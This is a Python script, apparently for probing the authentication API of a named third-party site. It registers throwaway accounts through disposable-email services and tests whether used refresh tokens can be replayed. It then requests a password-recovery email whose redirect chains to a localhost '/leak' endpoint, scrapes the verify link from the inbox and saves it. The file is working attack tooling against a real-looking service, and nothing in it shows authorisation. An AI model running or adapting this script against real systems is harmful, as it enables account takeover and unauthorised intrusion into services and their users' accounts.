import ssl, json, urllib.request, urllib.error, urllib.parse, sys, time, random, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"
GM = "https://api.guerrillamail.com/ajax.php"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json"}

def req(method, url, body=None, token=None, extra=None):
    h = dict(UA)
    if token: h["Authorization"] = f"Bearer {token}"
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")

# ---------- A) refresh-token reuse with >20s gap ----------
tag = random.randint(100000, 999999)
email = f"authbr{tag}@dropmail.me"; pw = "Zq7#vL2!mX9$wR4"
st, hd, b = req("POST", SUPA + "/auth/v1/signup", {"email": email, "password": pw}, extra={"apikey": KEY})
sess = json.loads(b); AT, RT = sess["access_token"], sess["refresh_token"]
print("signup:", st, "| RT len:", len(RT))
st, hd, b1 = req("POST", SUPA + "/auth/v1/token?grant_type=refresh_token", {"refresh_token": RT}, extra={"apikey": KEY})
r1 = json.loads(b1) if st == 200 else {}
print(f"refresh#1: {st} | new RT differs from original: {r1.get('refresh_token') != RT}")
time.sleep(22)
st, hd, b2 = req("POST", SUPA + "/auth/v1/token?grant_type=refresh_token", {"refresh_token": RT}, extra={"apikey": KEY})
r2 = json.loads(b2) if st == 200 else {}
print(f"refresh#2 SAME ORIGINAL RT after 22s: {st} | access ok: {bool(r2.get('access_token'))} | err: {b2[:120]}")
time.sleep(1)
if r1.get("refresh_token"):
    st, hd, b3 = req("POST", SUPA + "/auth/v1/token?grant_type=refresh_token", {"refresh_token": r1["refresh_token"]}, extra={"apikey": KEY})
    print(f"refresh#3 MINTED RT from #1: {st} | {'access ok' if st==200 else b3[:120]}")

# ---------- B) prepare recovery link with nested localhost redirect ----------
st, hd, b = req("GET", GM + "?f=get_email_address&lang=en&site=guerrillamail.com")
d = json.loads(b); sid = d["sid_token"]; gaddr = d["email_addr"].split("@")[0] + "@sharklasers.com"
print("\nGM inbox:", gaddr)
st, hd, b = req("POST", SUPA + "/auth/v1/signup", {"email": gaddr, "password": pw}, extra={"apikey": KEY})
print("signup GM:", st)
target = "https://onlyfakeai.ru/login?redirect=" + urllib.parse.quote("http://127.0.0.1:8899/leak", safe="")
st, hd, b = req("POST", SUPA + "/auth/v1/recover?redirect_to=" + urllib.parse.quote(target, safe=""),
                {"email": gaddr}, extra={"apikey": KEY})
print("recover:", st, b[:120])
link = None
for i in range(25):
    time.sleep(4)
    st, hd, b = req("GET", GM + f"?f=get_email_list&offset=0&sid_token={sid}")
    try: lst = json.loads(b).get("list", [])
    except Exception: lst = []
    hit = [m for m in lst if "onlyfake" in (m.get("mail_from") or "").lower()]
    if hit:
        st, hd, b = req("GET", GM + f"?f=fetch_email&email_id={hit[0]['mail_id']}&sid_token={sid}")
        msg = json.loads(b)
        body = "\n".join(str(msg.get(k) or "") for k in ("mail_body", "mail_body_text", "mail_body_html"))
        links = re.findall(r"https?://[^\s\"'<>\)]+", body)
        link = next((u for u in links if "verify" in u), None)
        break
print("VERIFY LINK:", link)
if link:
    open("p2_verify_link.txt", "w", encoding="utf-8").write(link.replace("&amp;", "&"))
    print("saved p2_verify_link.txt")
